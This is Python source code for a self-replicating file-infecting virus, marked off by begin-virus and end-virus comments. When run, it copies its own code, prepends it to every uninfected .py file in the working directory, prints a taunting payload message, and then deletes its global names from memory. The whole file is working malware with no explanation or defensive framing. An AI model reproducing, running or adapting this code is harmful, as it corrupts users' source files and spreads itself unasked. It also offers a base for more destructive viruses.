1# begin-virus

 2

 3import glob

 4

 5def find_files_to_infect(directory = "."):

 6    return [file for file in glob.glob("*.py")]

 7

 8def get_content_of_file(file):

 9    data = None

10    with open(file, "r") as my_file:

11        data = my_file.readlines()

12

13    return data

14

15def get_content_if_infectable(file):

16    data = get_content_of_file(file)

17    for line in data:

18        if "# begin-virus" in line:

19            return None

20    return data

21

22def infect(file, virus_code):

23    if (data:=get_content_if_infectable(file)):

24        with open(file, "w") as infected_file:

25            infected_file.write("".join(virus_code))

26            infected_file.writelines(data)

27

28def get_virus_code():

29

30    virus_code_on = False

31    virus_code = []

32

33    code = get_content_of_file(__file__)

34

35    for line in code:

36        if "# begin-virus\n" in line:

37            virus_code_on = True

38

39        if virus_code_on:

40            virus_code.append(line)

41

42        if "# end-virus\n" in line:

43            virus_code_on = False

44            break

45

46    return virus_code

47

48def summon_chaos():

49    # the virus payload

50    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

51

52# entry point 

53

54try:

55    # retrieve the virus code from the current infected script

56    virus_code = get_virus_code() 

57

58    # look for other files to infect

59    for file in find_files_to_infect():

60        infect(file, virus_code)

61

62    # call the payload

63    summon_chaos()

64

65# except:

66#     pass

67

68finally:

69    # delete used names from memory

70    for i in list(globals().keys()):

71        if(i[0] != '_'):

72            exec('del {}'.format(i))

73

74    del i

75

76# end-virus
